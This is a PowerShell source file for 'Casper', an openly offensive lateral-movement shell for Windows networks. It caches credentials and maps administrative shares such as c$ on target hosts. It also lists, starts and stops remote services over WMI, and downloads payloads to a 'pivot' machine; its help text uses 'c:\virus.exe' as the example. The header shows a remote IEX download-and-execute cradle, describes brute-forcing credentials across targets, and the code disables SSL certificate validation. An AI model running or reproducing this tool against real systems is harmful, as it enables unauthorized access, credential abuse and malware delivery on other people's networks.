<#
 Copyright (c) 2014, butterworth1492
 All rights reserved.

 Redistribution and use in source and binary forms, with or without
 modification, are permitted provided that the following conditions are met:

 * Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

 * Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

  Casper the Friendly Shell
  "Speak softly and carry a big stick."
  
  The idea behind Casper is to take the situational awareness
  provided by other tools (ie Veil Powerview) and provide
  a low-footprint capability for interacting with the
  identified assets.  We want to ...
  
      - Implement everything in native Powershell and
        available APIs using no external programs
      - Add no overt drive letters to a running system
        but still make browsing of remote shares easy   
      - Remove much of the pain of entering or pasting
        repetitive credentials and target information
      - Cache credentials securely in memory
      - Provide a shell environment that gives immediate
        and useful feedback about its state

      ... and last but not least ...

      - Be Simple
    
  Ways to source this script into a powershell environment:
    1. Copy script and paste at PS prompt
    
    2. Dot-sourcing from the PS prompt
       PS> . .\casper.ps1
       
    3. Sourcing as a remote HTTP resource
       [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
       IEX(New-Object Net.WebClient).DownloadString('https://server/casper.ps1')
       # Note...first line may only be required if using SSL.
      
  Once sourced, the following commands will be added to 
  powershell for immediate use:
    
    casper       (Prints available commands and examples.)
    creds        (Cache new user/pass credentials.)
    target       (Cache new target credentials.)
    env          (Print the cache.)
    list         (List currently mapped shares.)
    list-remote  (List shares on target specified in cache.)
    map          (Map a share from the target specified in cache.)
    unmap        (Unmap a mapped share.)
    browse       (Browse a mapped share.)
    download     (Download a payload via HTTP.)
    services     (List remote services.)
    service      (Control remote service.)
    
  Since Capser intentionally doesn't create new drive letters, 
  labels are used instead.
    
    >>> list
      Localhost has 3 mapped drive(s).
      
      Label                                   Share
      ------                                  -----
      32B5                                    \\192.168.101.39\c$
      F699                                    \\192.168.101.39\adm
      z:                                      \\192.168101.97\c$
      
    A label is a function of the hash generated by the share 
    string.  That is how Casper knows which label corresponds
    to which mapped share.  
      
    Any share that has a drive letter (ie "z:") instead of a 
    label CAN be manipulated by casper but it is implicitly
    assumed to have been legitimately mapped by the administrator
    and is thus ignored by commands like 'unmap *'.  
    
  To get started, source casper into your powershell interpreter,
  have an idea of some targets to hit and some credentials to use,
  and set your credentials and target, and go!  
      
     UNSET@UNSET [C:\wherever]
     >>> target 192.168.101.40
     
     UNSET@192.168.101.40 [C:\wherever]
     >>> creds dom\user1 P@$$w0rd
     
     dom\user1@192.168.101.40 [C:\wherever]
     >>> env
        Username  ppf\administrator
        Password  >12deathstarStar Wars !@<
        Target    192.168.25.250
     
      
     You can set the target and credentials independently allowing 
     you to ...
       - Iterate through several targets using a single successful  
         set of credentials
       - Iterate through various credentials for a single target
         until you find some that work
#>

############################
##### Environmnet code #####
############################

# Make it so that it doesn't complain when connecting to an SSL-enabled URL.
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}


############################
##### Script variables #####
############################

# Credentials are stored in a PSCredential Object.
# The cached password is never stored in plaintext.
$credentials = $null

#The target and url are stored in plaintext.
$target = $null
$url = $null
$PWD = $null


############################
##### Helper functions #####
############################


function Print-Exception 
  { 
    <#
      Purpose: Tidies up our exception handling.
      Returns: N/A      
    #>
      
    param ( [string] $exception )
    Write-Host -foreground red "*****`n$($exception)`n*****" 
  } # End Print-Exception()


function Username 
  {
    <#
      Purpose: Returns the currently cached username.
      Returns: <String> | Null
    #>

    if ( !$Script:credentials ) 
      { $null } 
    else 
      {
        $c = $Script:credentials.getNetworkCredential()
        if ( $c.Domain )
          { "$($c.Domain)\$($c.Username)" }
        else 
          { $c.Username }
      }
  } # End Username()


function Password
  {
    <#
      Purpose: Returns the currently cached password.
      Returns: <String> | Null
    #>

    if ( !$Script:credentials ) 
      { $null } 
    else 
      { $Script:credentials.getNetworkCredential().Password }
  } # End Password()


function Get-Count
  {
    <#
      Purpose: Returns the number of items represented in
               the object parameter.  
      Returns: <Integer>
    #>
    
    param ( $object )
    if ( !$object ) 
      { 0 }
    elseif ( $object -is [System.Array] ) 
      { $object.count }
    else 
      { 1 }
  } # End Get-Count()


function Print-Banner
  {
    <#
      Purpose: Prints the welcome banner.
      Returns: N/A
    #>
    
    Write-Host ""
    Write-Host -foreground cyan "----------------------------"
    Write-Host -foreground cyan "[[[ Casper the friendly shell ]]]"
    Write-Host -foreground cyan "Remember to set your target and credentials before proceeding."
    Write-Host -foreground cyan "Type 'casper' if you need help."
    Write-Host -foreground cyan "----------------------------"
  } # End Print-Banner()


function Check-Target
  {
    <#
      Purpose: Verifies that the username, password, and
               target are all set.
      Returns: <True/False>
    #>
    
    $retval = $true
    if ( !( Username ) -or !( Password ) ) 
      { 
        Write-Host -background red -foreground white "Credentials not set. Use 'creds <user> <pass>' ."
        $retval = $false
      }
    elseif ( !$Script:target )
      {
        Write-Host -background red -foreground white "Target host not set. Use 'target <host>' ."
        $retval = $false
      }
    $retval
  } # End Check-Target()


function Hash-Value
  {
    <#
      Purpose: Returns the abbreviated hash value of a string.
      Returns: <String>
    #>
    
    param ( [string] $value )
    $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $utf8 = new-object -TypeName System.Text.UTF8Encoding
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($value)))

   if ( $hash -match '^(..)-.+-(..)$' ) 
     { "$($matches[1])$($matches[2])" }
   else
     { $null }    
  } # End Hash-Value()


function Find-Mapping
  {
    <#
      Purpose: When provided a hash, returns the mapped drive that 
               corresponds to it.
      Returns: <String> | Null
    #>
    
    param ( [string] $mapping )
    $mounts = ( New-Object -Com WScript.Network ).EnumNetworkDrives()
    $count = $mounts.Count()
    if ( $count -gt 0 )
      {
        $collection = @()
        for ($i=1; $i -lt $count; $i+=2)
          {
            if ( $mapping -match ( Hash-Value -Value $mounts.Item($i)) )
              { return $mounts.Item($i) }  
          }
      }
    else 
      { $null }
  } # End Find-Mapping()


function Verify-Local-Map( [string] $share )
  {
    <#
      Purpose: When provided a share, returns whether or not it
               is currently mapped. 
      Returns: <True/False>
    #>
    
    try
      {
        $mounts = (New-Object -Com WScript.Network).EnumNetworkDrives()
        $count = $mounts.Count()
        if ( $count -eq 0 )
          {  return $false }
        else
          {
            for ($i=1; $i -lt $count; $i+=2)
              {
                if ( $mounts.Item($i) -eq $share )
                  { return $true }
              }
            return $false
          }
      }
    catch { Print-Exception -Exception $_ }
  } # End Verify-Local-Map()


function Prompt 
  { 
    <#
      Purpose: Updates the prompt after each command.
      Returns: <String>
    #>
    $Script:pwd = ( Get-Item -Path ".\" -Verbose ).Fullname
    $user = $( if ( Username) { ( Username ) } else { "UNSET" } )
    $target = $( if ($Script:target) { $Script:target } else { "UNSET" } )
    Write-Host
    Write-Host -nonewline -foreground green $user
    Write-Host -nonewline -foreground yellow "@"
    Write-Host -nonewline -foreground green $target
    if ( $(Get-Location).path -match 'FileSystem::(\\\\.+)$' )
      { Write-Host -nonewline -foreground magenta " [$($matches[1])] " }
    else
      { Write-Host -nonewline -foreground white " [$(Get-Location)] " }
    Write-Host ""
    Write-Host -nonewline ">>> "
    " " 
  } # End Prompt()


# Making all the helper functions private
(Get-Command Print-Exception).Visibility  = "Private"
(Get-Command Username).Visibility         = "Private"
(Get-Command Password).Visibility         = "Private"
(Get-Command Get-Count).Visibility        = "Private"
(Get-Command Print-Banner).Visibility     = "Private"
(Get-Command Check-Target).Visibility     = "Private"
(Get-Command Hash-Value).Visibility       = "Private"
(Get-Command Find-Mapping).Visibility     = "Private"
(Get-Command Verify-Local-Map).Visibility = "Private"
(Get-Command Prompt).Visibility           = "Public"


#################################
##### Commandline functions #####
#################################

# These functions implement commands that are meant to be called
# interactively by the user from the PowerShell prompt


Set-Alias casper Print-Help
function Print-Help
  {
    <#
      Purpose: Prints a list of the available commands and examples.
      Returns: N/A
    #>
    Write-Host -nonewline -foreground yellow "   here                                "
    Write-Host -foreground white " - A shell-independent way of seeing your PWD."
    Write-Host -nonewline -foreground yellow "   creds dom\bob p@Ssw0rd              "
    Write-Host -foreground white " - Sets the currently cached credentials."
    Write-Host -nonewline -foreground yellow "   target 1.2.3.4                      "
    Write-Host -foreground white " - Sets the currently cached target machine."
    Write-Host -nonewline -foreground yellow "   env                                 "
    Write-Host -foreground white " - Prints current username/password/target."
    Write-Host -nonewline -foreground yellow "   list                                "
    Write-Host -foreground white " - Lists the currently mapped drives on local machine."
    Write-Host -nonewline -foreground yellow "   list-remote                         "
    Write-Host -foreground white " - Lists available shares on the remote host."
    Write-Host -nonewline -foreground yellow "   map c$                              "
    Write-Host -foreground white " - Maps the 'c$' share on the target."
    Write-Host -nonewline -foreground yellow "   unmap \\1.2.3.4\c$                  "
    Write-Host -foreground white " - Unmaps the '\\1.2.3.4\c$' share."
    Write-Host -nonewline -foreground yellow "   unmap F3B1                          "
    Write-Host -foreground white " - Unmaps the share associated with the label 'F3B1'."
    Write-Host -nonewline -foreground yellow "   unmap *                             "
    Write-Host -foreground white " - Unmaps all shares that have no assigned drive letter."
    Write-Host -nonewline -foreground yellow "   browse \\1.2.3.4\c$                 " 
    Write-Host -foreground white " - Sets the current location to the \\1.2.3.4\c% UNC share."
    Write-Host -nonewline -foreground yellow "   browse F3B1                         "
    Write-Host -foreground white " - Sets the current location to the share associated with" 
    Write-Host -foreground white "                                          the label 'F3B1'."
    Write-Host -nonewline -foreground yellow "   download `"c:\virus.exe`"             "
    Write-Host -foreground white " - Downloads remote file and saves as 'c:\virus.exe'."
    Write-Host -nonewline -foreground yellow "   download `"`$(here)\virus.exe`"        "
    Write-Host -foreground white " - Downloads remote file and saves as 'virus.exe' in current directory."
    Write-Host -nonewline -foreground yellow "   services                            "
    Write-Host -foreground white " - Lists services on the remote host"
    Write-Host -nonewline -foreground yellow "   service svc_name (status|start|stop)"
    Write-Host -foreground white " - Start, stop, and view status of remote services."
  } # End Print-Help()
  

Set-Alias env Print-Environment
function Print-Environment
  {
    <#
      Purpose: Prints the cached username, password, and target.
      Returns: N/A
    #>

    Write-Host -nonewline -foreground yellow "   Username  "
    Write-Host -foreground gray $( if ( !(Username) ){ "[UNSET]" } else { (Username) } )
    Write-Host -nonewline -foreground yellow "   Password  "
    Write-Host -nonewline -foreground magenta ">"
    Write-Host -nonewline -foreground gray $( if ( !(Password) ) { "[UNSET]" } else { (Password) } )
    Write-Host -foreground magenta "<"
    Write-Host -nonewline -foreground yellow "   Target    "
    Write-Host -foreground gray $( if (!$target) { "[UNSET]" } else { $target } )
    Write-Host -nonewline -foreground yellow "   URL       "
    Write-Host -foreground gray $( if (!$url) { "[UNSET]" } else { $url } )
  } # End Print-Environment()


Set-Alias here Print-Current-Directory
function Print-Current-Directory
  {
    ( Get-Item -Path ".\" -Verbose ).Fullname
  } # End Print-Current-Directory()

Set-Alias creds Set-Creds
function Set-Creds
  {
    <#
      Purpose: Cache new username/password credentials.
      Returns: N/A
    #>
    param ( [string] $user = $null, [String] $pass = $null )
    if ( !$user -or !$pass )
      {
        Write-Host "Usage: creds <username> <password>"
        Write-Host "Type 'casper' for example."
      }
    else
      {
        $secure_pass = "$($pass)" | ConvertTo-SecureString -AsPlainText -Force
        $Script:credentials = New-Object -Typename System.Management.Automation.PSCredential($user,$secure_pass)
      }
  } # End Set-Creds


Set-Alias target Set-Target
function Set-Target
  {
    <#
      Purpose: Cache a new target.
      Returns: N/A
    #>

    param ( [string] $target = $null )
    if ( !$target )
      {
        Write-Host "Usage: target <host>"
        Write-Host "Type 'casper' for example."
      }
    else
      { $Script:target = $target }
  } # End Set-Target()


Set-Alias url Set-Url
function Set-Url
  {
    <#
      Purpose: Cache a new URL.
      Returns: N/A
    #>

    param ( [string] $url = $null )
    if ( !$url )
      {
        Write-Host "Usage: url <host>"
        Write-Host "Type 'casper' for example."
      }
    else
      { $Script:url = $url }
  } # End Set-Url()


Set-Alias list-remote ListRemoteShares
function ListRemoteShares
  {
    <#
      Purpose: List available shares on the $target machine using 
               $credentials.
      Returns: <Array> | Null
    #>

    if ( !$(Check-Target) ) 
      { return $null }    
    try
      { 
        $shares = Get-WmiObject -class win32_share -computername $Script:target -credential $Script:credentials | select Name,Path 
        $count = Get-Count -Object $shares
        Write-Host -nonewline -foreground green "$($Script:target) has "
        Write-Host -nonewline -foreground yellow $($count)
        Write-Host -nonewline -foreground green " shares.`r`n"
        if ( $count -gt 0 ) 
          { return $shares }
        else
          { return $null }
      }
    catch { Print-Exception -Exception $_ }
  } # End ListRemoteShares()


Set-Alias list List-Local-Maps
function List-Local-Maps
  {
    <#
      Purpose: List mapped shares on the local machine.
      Returns: <Array> | Null
    #>
    try
      { 
        $mounts = (New-Object -Com WScript.Network).EnumNetworkDrives()
        $count = $mounts.Count()
        Write-Host -nonewline -foreground green "Localhost has "
        Write-Host -nonewline -foreground yellow $($count/2)
        Write-Host -foreground green " mapped drive(s)."
        if ( $count -gt 0 )
          {
            $collection = @()
            for ($i=1; $i -lt $count; $i+=2)
              {
                $mount = New-Object PSObject
                Add-Member -InputObject $mount -MemberType NoteProperty -Name Label -Value ""
                Add-Member -InputObject $mount -MemberType NoteProperty -Name Share -Value ""
                if ( $mounts.Item($i-1) ) 
                  { $mount.Label = $mounts.Item($i-1) } 
                else 
                  { $mount.Label = Hash-Value -Value $mounts.Item($i) }
                $mount.Share = $mounts.Item($i)
                $collection += $mount
              }
            return $collection
          }
        else 
          { return $null }
      }
    catch { Print-Exception -Exception $_ }
  } # End List-Local-Maps


Set-Alias map Map-Network-Drive
function Map-Network-Drive
  {
    <#
      Purpose: Map a share from the $target machine using $credentials.
      Returns: N/A
    #>

    param ( [string] $share = $null )
    if ( !$share )                                        
      {
        Write-Host "Usage: map <share>"
        Write-Host "Type 'casper' for example."
        return
      }
    if ( !$(Check-Target) )
      { return }    
    try
      {    
        (New-Object -Com WScript.Network).MapNetworkDrive("", "\\$($Script:target)\$($share)", $false, (Username), (Password) )
      }
    catch { Print-Exception -Exception $_ }
  } # End Map-Network-Drive


Set-Alias unmap Unmap-Network-Drive
function Unmap-Network-Drive
  {
    <#
      Purpose: Unmap a share from the local machine $credentials.
      Returns: N/A
    #>

    param ( [string] $share = $null )
    if ( !$share )
      {
        Write-Host "Usage: unmap <share>"
        Write-Host "Type 'casper' for example."
        return
      }
    try
      {
        if ( $share -match '(?i)^([a-z0-9]{4})$' )
          { $share = Find-Mapping $matches[1] }      
        if ( (Get-Location).toString().Contains($share) )
          { throw "You are currently browsing this share.  'cd' or 'browse' elsewhere and try again." }      
        if ( $share -eq "*" )
          {
            $mounts = (New-Object -Com WScript.Network).EnumNetworkDrives()
            $count = $mounts.Count()
            if ( $count -eq 0 ) {  return $false }
            Write-Host -nonewline -foregroundcolor yellow "This will remove"
            Write-Host -nonewline -foregroundcolor red " ALL "
            Write-Host -nonewline -foregroundcolor yellow "mapped shares that have no drive letters."
            $input = $null
            do
              {
                Write-Host -nonewline -foregroundcolor yellow "Proceed?  (Yes/No): "
                $input = Read-Host
              }
            while ( $input -notmatch '(?i)^(yes|no)$' )
            if ( $input -match 'no' )
              { 
                Write-Host -foregroundcolor yellow "Cancelled."
                return 
              }
            if ( $count -eq 0 )
              {  return  }
            else
              {
                for ($i=1; $i -lt $count; $i+=2)
                  {
                    Unmap-Network-Drive -Share $mounts.Item($i)
                    Write-Host "   '$($mounts.Item($i))' unmapped" 
                  }
              }
          }
        else
          { (New-Object -Com WScript.Network).RemoveNetworkDrive("$($share)") }
      }
    catch { Print-Exception -Exception $_ }
  } # End Unmap-Network-Drive()


Set-Alias browse Browse-Network-Drive
function Browse-Network-Drive
  {
    <#
      Purpose: Browse a share from the $target machine using $credentials.
      Returns: N/A
    #>

    param ( [string] $share = $null )
    if ( !$share )
      {
        Write-Host "Usage: browse <share>"
        Write-Host "Type 'casper' for example."
        return
      }
    try
      {
        if ( $share -match '(?i)^([a-z0-9]{4})$' )
          { $share = Find-Mapping -Mapping $matches[1] }      
        if ( !$(Verify-Local-Map -Share $share) )
          { throw "'$($share)' is not currently mapped. Use 'map' to map it first." }
        elseif ( !$(Test-Path -Path $share) )
          { throw "Test-Path failed on that share for some reason." }
        else
          { Set-Location $share }
      }
    catch { Print-Exception -Exception $_ }
  } # End Browse-Network-Drive()


set-Alias download Http-Download-File
function Http-Download-File
  {
    <#
      Purpose: Download a remote file via HTTP/HTTPS
      Returns: N/A
    #>

    param ( [string] $file = $null )
    if ( !$file )
      {
        Write-Host "Usage: download <filename>"
        Write-Host "Type 'casper' for example."
        return
      }
    try
      {
        $destination = $null
        if ( $file -match '\\' )
          { $destination = $file }
        else
          { $destination = "$(here)\$($file)" }

        ( New-Object System.Net.WebClient ).DownloadFile( $url, $destination )
        if ( !( Test-Path -Path $destination ) )
          { throw "File not saved for some reason!" }
       
        Write-Host ""
        Write-Host "   Payload saved to:    $($destination)"
        Write-Host "   Credentials used:    $(Username) >$(Password)<"
        Write-Host "   Pivot computer name: $($env:computername)"
        Write-Host "   Pivot user name:     $($env:username)"
        Write-Host "   Pivot user domain:   $($env:userdomain)"
      }
    catch { Print-Exception -Exception $_ }
  } # end Http-Download-File


Set-Alias services ListRemoteServices
function ListRemoteServices
  {
    <#
      Purpose: List available shares on the $target machine using 
               $credentials.
      Returns: <Array> | Null
    #>

    if ( !$(Check-Target) ) 
      { return $null }    
    try
      { 
        $services = Get-WmiObject -class win32_service -computer $Script:target -credential $Script:credentials
        $count = Get-Count -Object $services
        Write-Host -nonewline -foreground green "$($Script:target) has "
        Write-Host -nonewline -foreground yellow $($count)
        Write-Host -nonewline -foreground green " services.`r`n"
        if ( $count -gt 0 )
          {
            $collection = @()
            for ($i=1; $i -lt $count; $i+=1)
              {
                $service = New-Object PSObject
                Add-Member -InputObject $service -MemberType NoteProperty -Name Name -Value ""
                Add-Member -InputObject $service -MemberType NoteProperty -Name State -Value ""
                Add-Member -InputObject $service -MemberType NoteProperty -Name PID -Value ""
                Add-Member -InputObject $service -MemberType NoteProperty -Name StartMode -Value ""
                Add-Member -InputObject $service -MemberType NoteProperty -Name Status -Value ""
                $service.name = $services[$i].Name
                $service.state = $services[$i].State
                $service.pid = $services[$i].ProcessId
                $service.startmode = $services[$i].StartMode
                $service.status = $services[$i].Status
                $collection += $service
              }
            return ($collection | format-table)
          }
        else
          { return $null }
      }
    catch { Print-Exception -Exception $_ }
  } # End ListRemoteServices()


Set-Alias service ControlRemoteService
function ControlRemoteService
  {
    <#
      Purpose: Control or return the status of a remote service.
      Returns: N/A
    #>

    param ( [string] $service = $null, [String] $operation = $null )
    if ( !$service -or !$operation )
      {
        Write-Host "Usage: <service> <status|start|stop|add|remove>"
        Write-Host "Type 'casper' for example."
        return
      }

    if ( !$(Check-Target) ) 
      { return $null }    

    try
      { 
        if ( $operation -eq "status" )
          {
            Get-WmiObject -class win32_service -filter "name='$($service)'" -computer $Script:target -credential $Script:credentials
          }    
        elseif ( $operation -eq "stop" )
          {
            $result = (Get-WmiObject -class win32_service -filter "name='$($service)'" -computer $Script:target -credential $Script:credentials).stopservice()
            service $service status 
          }  
        elseif ( $operation -eq "start" )
          {
            $result = (Get-WmiObject -class win32_service -filter "name='$($service)'" -computer $Script:target -credential $Script:credentials).startservice()
            service $service status 
          }  
      }
    catch { Print-Exception -Exception $_ }

  } # End ListRemoteServices()



####################
##### Mainline #####
####################

cls
Print-Banner
